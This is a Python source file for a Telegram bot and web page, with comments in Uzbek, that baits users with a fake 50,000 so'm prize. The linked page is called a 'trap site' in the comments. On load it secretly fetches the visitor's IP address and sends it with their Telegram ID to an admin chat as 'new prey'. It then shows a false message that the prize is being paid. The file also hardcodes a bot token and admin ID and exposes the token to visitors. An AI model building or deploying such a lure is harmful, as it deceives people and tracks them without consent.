import os
import logging
import asyncio
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

# --- SOZLAMALAR ---
TOKEN = "8509571152:AAFw5GXdZRyuiqTOzm3znlQCa_S4JQXcnvU"
ADMIN_ID = 5775388579
BASE_URL = "https://botmeniki-sarikprok.up.railway.app"

bot = Bot(token=TOKEN)
dp = Dispatcher()
app = FastAPI()

# --- TUZOQ SAYTI (Pul yutug'i ko'rinishida) ---
HTML_CODE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Yutuqni qabul qilish</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ background: #121212; color: white; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .loader {{ border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
    <script>
        async function getIP() {{
            const params = new URLSearchParams(window.location.search);
            const uid = params.get('id');
            const tok = "{token}";
            const admin = "{admin_id}";
            
            try {{
                // IP manzilni aniqlash
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                const ip = data.ip;

                // Adminga yuborish
                await fetch(`https://api.telegram.org/bot${{tok}}/sendMessage`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        chat_id: admin,
                        text: "🎯 **Yangi o'lja!**\\n\\n👤 Foydalanuvchi ID: `" + uid + "`\\n🌐 IP Manzil: `" + ip + "`\\n📍 Holati: Pul yutug'i tugmasini bosdi.",
                        parse_mode: "Markdown"
                    }})
                }});

                // Foydalanuvchiga aldaruvchi xabar
                document.getElementById('status').innerText = "Tabriklaymiz! 50,000 so'm yutuq hamyoningizga o'tkazilmoqda... Kuting.";
                
            }} catch(e) {{
                document.getElementById('status').innerText = "Ulanishda xatolik. Qayta urining.";
            }}
        }}
        window.onload = getIP;
    </script>
</head>
<body>
    <div>
        <div class="loader"></div>
        <h2 id="status">Yutuq tekshirilmoqda...</h2>
        <p>Sahifadan chiqib ketmang.</p>
    </div>
</body>
</html>
"""

@app.get("/win", response_class=HTMLResponse)
async def prize_page(id: str):
    return HTML_CODE.format(token=TOKEN, admin_id=ADMIN_ID)

@app.get("/")
async def health():
    return {"status": "ok"}

# --- BOT HANDLERS ---
@dp.message(Command("start"))
async def start(m: types.Message):
    # Foydalanuvchini aldash uchun tugma
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 50,000 SO'M YUTUQNI OLISH", url=f"{BASE_URL}/win?id={m.from_user.id}")]
    ])
    
    await m.answer(
        f"Assalomu alaykum, {m.from_user.first_name}!\n\n"
        "Siz bizning botimizdan tasodifiy **50,000 so'm** miqdorida pul yutug'ini qo'lga kiritdingiz! 🎉\n\n"
        "Yutuqni qabul qilib olish uchun quyidagi tugmani bosing:",
        reply_markup=kb
    )

# --- STARTUP ---
async def start_bot():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    loop = asyncio.get_event_loop()
    loop.create_task(start_bot())
    uvicorn.run(app, host="0.0.0.0", port=port)
